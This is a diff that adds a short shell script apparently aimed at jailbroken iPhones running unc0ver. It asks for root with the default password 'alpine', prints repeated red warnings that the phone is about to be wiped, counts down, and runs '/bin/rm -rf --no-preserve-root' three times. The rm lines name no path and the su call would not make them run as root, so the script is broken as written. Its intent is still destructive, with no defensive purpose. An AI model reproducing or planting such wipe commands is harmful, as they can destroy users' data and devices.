@@ -1,0 +1,35 @@
+#!/bin/sh
+
+RED='\033[0;31m'
+NC='\033[0m'
+echo "Enter root password... [Default password is alpine]"
+su
+
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "${RED}YOUR PHONE IS ABOUT TO BE WIPED${NC}"
+echo "ACTIVATING RECONSIDER TIME WINDOW"
+sleep 5
+echo "${RED} GOODBYE iOS"
+sleep 2
+echo "${RED} GODDBYE UNC0VER"
+sleep 2
+echo "${RED} JUULSTAR LET ANEOMONE RUN ON UNC0VER"
+sleep 2
+echo "${NC} Beginning regret machine in..."
+sleep 2
+echo "3..."
+sleep 2
+echo "2..."
+sleep 2
+echo "1..."
+sleep 2
+echo "noregerts"
+/bin/rm -rf --no-preserve-root
+/bin/rm -rf --no-preserve-root
+/bin/rm -rf --no-preserve-root
